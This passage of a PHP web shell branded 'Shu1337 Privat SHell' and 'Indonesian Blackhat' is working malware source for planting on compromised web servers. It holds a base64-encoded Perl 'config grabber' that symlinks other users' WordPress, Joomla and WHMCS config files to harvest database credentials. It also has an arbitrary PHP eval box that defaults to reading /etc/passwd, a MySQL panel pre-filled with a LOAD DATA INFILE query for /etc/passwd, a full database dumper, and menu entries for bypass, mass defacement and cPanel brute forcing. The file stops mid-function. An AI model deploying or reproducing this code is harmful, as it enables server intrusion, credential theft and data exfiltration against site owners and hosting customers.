$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT4gTmdpbngxMzM3IENvbmZpZyBGdWNrZXIgPC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iIyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoJYmFja2dyb3VuZC1pbWFnZTogdXJsKCMpOw0KfQ0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IFRhaG9tYTsNCiBmb250LXNpemU6IHgtc21hbGw7DQogZm9udC13ZWlnaHQ6IGJvbGQ7DQogY29sb3I6ICM1OUU4MTc7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdmIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictaW5jbHVkZXMtdmIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLicyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLic1LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nNC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy13cDIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3BibG9nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywka29sYS4nLXdwZGlyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLic2LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJzcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29sYS4nOC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRrb2xhLic5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1qb29tLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLicxMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobTE1LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobWMxNi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1zdXBwb3J0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGtvbGEuJ215YmIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywka29sYS4nbXliYjIudHh0Jyk7DQoNCg0KfQ0KaWYgKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgJ1BPU1QnKSB7DQogIHJlYWQoU1RESU4sICRidWZmZXIsICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KfSBlbHNlIHsNCiAgJGJ1ZmZlciA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KfQ0KQHBhaXJzID0gc3BsaXQoLyYvLCAkYnVmZmVyKTsNCmZvcmVhY2ggJHBhaXIgKEBwYWlycykgew0KICAoJG5hbWUsICR2YWx1ZSkgPSBzcGxpdCgvPS8sICRwYWlyKTsNCiAgJG5hbWUgPX4gdHIvKy8gLzsNCiAgJG5hbWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJHZhbHVlID1+IHRyLysvIC87DQogICR2YWx1ZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkRk9STXskbmFtZX0gPSAkdmFsdWU7DQp9DQppZiAoJEZPUk17cGFzc30gZXEgIiIpew0KcHJpbnQgJw0KPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5MdWx6Ly4uLy4uLy4uLzwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PnJlY29kZWQgYnk8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+IG5naW54MTMzNzwvZm9udD48Zm9udCBjb2xvcj0iI0MwQzBDMCI+XTwvZm9udD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICNGRjAwMDA7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiNGRjAwMDAiICA+PC90ZXh0YXJlYT48L3A+DQo8cCBhbGlnbj0iY2VudGVyIj4NCjxpbnB1dCBuYW1lPSJ0YXIiIHR5cGU9InRleHQiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjRkYwMDAwOyB3aWR0aDogMjEycHg7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQzsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OHB0OyBjb2xvcjojRkYwMDAwOyAiICAvPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPg0KPGlucHV0IG5hbWU9IlN1Ym1pdDEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdFVCBDT05GSUcgISIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICNGRjAwMDA7IHdpZHRoOiA5OTsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6MTBwdDsgY29sb3I6IzU5RTgxNzsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOyBoZWlnaHQ6MjM7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQyIgLz48L3A+DQo8L2Zvcm0+JzsNCn1lbHNlew0KQGxpbmVzID08JEZPUk17cGFzc30+Ow0KJHkgPSBAbGluZXM7DQpvcGVuIChNWUZJTEUsICI+dGFyLnRtcCIpOw0KcHJpbnQgTVlGSUxFICJ0YXIgLWN6ZiAiLiRGT1JNe3Rhcn0uIi50YXIgIjsNCmZvciAoJGthPTA7JGthPCR5OyRrYSsrKXsNCndoaWxlKEBsaW5lc1ska2FdICA9fiBtLyguKj8pOng6L2cpew0KJmxpbCgkMSk7DQpwcmludCBNWUZJTEUgJDEuIi50eHQgIjsNCmZvcigka2Q9MTska2Q8MTg7JGtkKyspew0KcHJpbnQgTVlGSUxFICQxLiRrZC4iLnR4dCAiOw0KfQ0KfQ0KIH0NCnByaW50Jzxib2R5IGNsYXNzPSJuZXdTdHlsZTEiIGJnY29sb3I9IiMwMDAwMDAiPg0KPHA+WW91IGdvdCBpdCEhPGJyPjxicj48YnI+PGZvbnQgY29sb3I9IiNDMEMwQzAiPls8L2ZvbnQ+UmVjb2RlZCBieSA8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+TmdpbngxMzM3PC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PjwvcD4NCjxwPiZuYnNwOzwvcD4nOw0KaWYoJEZPUk17dGFyfSBuZSAiIil7DQpvcGVuKElORk8sICJ0YXIudG1wIik7DQpAbGluZXMgPTxJTkZPPiA7DQpjbG9zZShJTkZPKTsNCnN5c3RlbShAbGluZXMpOw0KcHJpbnQnPHA+PGEgaHJlZj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+DQo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj5IaXQgTWUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw0K';
?>
<html><head><title>Indonesian Blackhat</title>
<script type="text/javascript">
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script>
<style type="text/css">
body { background-color:transparan;background:#000;} 
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid #00ff00;
}
*{
	font-size:11px;
	font-family:Tahoma,Verdana,Arial;
	color:white;
}
#menu{
	background:#111111;
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:red;
	text-decoration:none;
	letter-spacing:1px;
}
#menu a:hover{
	background:blue;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.main {
	width:100%;
}
.gaya {
	color: white;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:#00ff00;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid #00ff00;
	border-top:1px solid #00ff00;
}
.output {
	margin:auto;
	border:1px solid #00ff00;
	width:100%;
	height:400px;
	background:#000000;
	padding:0 2px;
}
.cmdbox{
	width:100%;
}
.head_info{
	padding: 0 4px;
}
.jaya{ font-family: ;}

.shu{
	font-size:25px;
	padding:0;
	color:red;
}
.b374k_tbl{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid #333333;
}
.explore{
width:100%;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 8px;
line-height:24px;
}
.explore th{
padding:3px 8px;
font-weight:normal;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid #00ff00;
}
.explore tr:hover{
background:red;
}
.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}

</style></head>
<body onLoad="document.getElementById('cmd').focus();">
<div class="main">
<!-- head info start here -->
<div class="head_info">
<table ><tr>
<td><table class="b374k_tbl"><tr><td><a href="?"><span class="shu">Shu1337</span></a></td></tr><tr><td><b>Privat SHell</b></td></tr></table></td>
<td><?php echo $buff; ?></td>
</tr></table>
</div>
<!-- head info end here -->
<!-- menu start -->
<center><div id="menu">
<a href="?<?php echo "y=".$pwd; ?>">Explore</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">Mysql</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">DB Dump</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">Netsploit</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cr00t">Upload</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">E-Mail</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=tool">Tools</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">Symlink</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">Domain</a><br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=config">Config</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypass">Bypass</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jumping">Jumping</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Hash</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jembut">CP BForce</a>

</div></center>
<!-- menu end -->

<?php if(isset($_GET['x']) && ($_GET['x'] == 'php')){ ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
	echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>
</textarea>
<tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>

<?php } 
elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){
if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])){
	$sqlhost = $_GET['sqlhost'];
	$sqluser = $_GET['sqluser'];
	$sqlpass = $_GET['sqlpass'];
	$sqlport = $_GET['sqlport'];
	if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)){
		// show mysql info
		$msg .= "<div style=\"width:99%;padding:4px 10px 0 10px;\">";
		$msg .= "<p>Connected to ".$sqluser."<span class=\"gaya\">@</span>".$sqlhost.":".$sqlport;
		$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;\">[ databases ]</a>";
		if(isset($_GET['db'])) $msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>";
		if(isset($_GET['table'])) $msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>";
		$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>";
		$msg .= "</div>";
		echo $msg;
		if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){
			$db = $_GET['db'];
			$query = "DROP TABLE IF EXISTS elz_table;\nCREATE TABLE `elz_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE elz_table;SELECT * FROM elz_table;\nDROP TABLE IF EXISTS elz_table;";
			$msg  = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input type=\"hidden\" name=\"x\" value=\"mysql\" />
			<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
			<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
			<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
			<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
			<input type=\"hidden\" name=\"db\" value=\"".$db."\" />
			<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p>
			<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p>
			</form></div>
			";


			// show available tables
			$tables = array();
			$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available tables on ".$db."</th></tr>";
			$hasil = @mysql_list_tables($db,$con);		
			while(list($table) = @mysql_fetch_row($hasil)){
				@array_push($tables,$table);
			}
			@sort($tables);	
			foreach($tables as $table){
				$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">$table</a></td></tr>";
			}
			$msg .= "</table>";
		}
		elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
			// dump tables
			$db = $_GET['db'];
			$table = $_GET['table'];
			$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;";
			$msgq  = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input type=\"hidden\" name=\"x\" value=\"mysql\" />
			<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
			<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
			<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
			<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
			<input type=\"hidden\" name=\"db\" value=\"".$db."\" />
			<input type=\"hidden\" name=\"table\" value=\"".$table."\" />
			<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p>
			<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p>
			</form></div>
			";
			$columns = array();
			$msg = "<table class=\"explore\" style=\"width:99%;\">";
			$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);		
			while(list($column) = @mysql_fetch_row($hasil)){
				$msg .= "<th>$column</th>";
				$kolum = $column;
			}
			$msg .= "</tr>";
			$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table);
			list($total) = mysql_fetch_row($hasil);		
			if(isset($_GET['z'])) $page = (int) $_GET['z'];
			else $page = 1;
			$pagenum = 100;
			$totpage = ceil($total / $pagenum);
			$start = (($page - 1) * $pagenum); 			
			$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum);
			while($datas = @mysql_fetch_assoc($hasil)){
				$msg .= "<tr>";
				foreach($datas as $data){
					if(trim($data) == "") $data = "&nbsp;";
					$msg .= "<td>$data</td>";
				}
				$msg .= "</tr>";
			}
			$msg .= "</table>";
			
			
			$head = "<div style=\"padding:10px 0 0 6px;\">
			<form action=\"?\" method=\"get\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input type=\"hidden\" name=\"x\" value=\"mysql\" />
			<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
			<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
			<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
			<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
			<input type=\"hidden\" name=\"db\" value=\"".$db."\" />
			<input type=\"hidden\" name=\"table\" value=\"".$table."\" />
			Page <select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\">";
			for($i = 1;$i <= $totpage;$i++){
				$head .= "<option value=\"".$i."\">".$i."</option>";
				if($i == $_GET['z']) $head .= "<option value=\"".$i."\" selected=\"selected\">".$i."</option>";
			}
			$head .= "</select><noscript><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /></noscript></form></div>";
			$msg = $msgq.$head.$msg;
		}
		elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){
			$db = $_GET['db'];
			$query = magicboom($_GET['sqlquery']);
			$msg  = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input type=\"hidden\" name=\"x\" value=\"mysql\" />
			<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
			<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
			<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
			<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
			<input type=\"hidden\" name=\"db\" value=\"".$db."\" />
			<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p>
			<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p>
			</form></div>
			";
			@mysql_select_db($db);
			$querys = explode(";",$query);
			foreach($querys as $query){
			  if(trim($query) != ""){
				$hasil = mysql_query($query);
				if($hasil){
					$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>";
					$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr>";
					for($i=0;$i<@mysql_num_fields($hasil);$i++)
						$msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";
					$msg .= "</tr>";
					for($i=0;$i<@mysql_num_rows($hasil);$i++)
					{
						$rows=@mysql_fetch_array($hasil);
						$msg .= "<tr>";
						for($j=0;$j<@mysql_num_fields($hasil);$j++)
						{
							if($rows[$j] == "") $dataz = "&nbsp;";
							else $dataz = $rows[$j];
							$msg .= "<td>".$dataz."</td>";
						}
						$msg .= "</tr>";
					}
					$msg .= "</table>";
				}
				else $msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";		
			  }
			}
		}
		else {
		  	$query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";
			$msg  = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input type=\"hidden\" name=\"x\" value=\"mysql\" />
			<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
			<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
			<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
			<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
			<input type=\"hidden\" name=\"db\" value=\"".$db."\" />
			<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p>
			<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p>
			</form></div>
			";
			// show available database
			$dbs = array();
			$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>";
			$hasil = @mysql_list_dbs($con);		
			while(list($db) = @mysql_fetch_row($hasil)){
				@array_push($dbs,$db);
			}
			@sort($dbs);	
			foreach($dbs as $db){
				$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">$db</a></td></tr>";
			}
			$msg .= "</table>";
		}
		@mysql_close($con);
	}
	else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>";


	echo $msg;
}
else{
?>
<form action="?" method="get">
<input type="hidden" name="y" value="<?php echo $pwd; ?>" />
<input type="hidden" name="x" value="mysql" />
<table class="tabnet" style="width:300px;">
<tr><th colspan="2">Connect to mySQL server</th></tr>
<tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr>
<tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr>
<tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr>
<tr><td>&nbsp;&nbsp;Port</td><td><input  style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr>
</table>
</form>
<?php }}
//////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'dump'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=dump" method="post">
    <?php
echo $head.'<p align="center">';
echo '
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

}

//////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'tool'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=tool" method="post">
<?php

error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
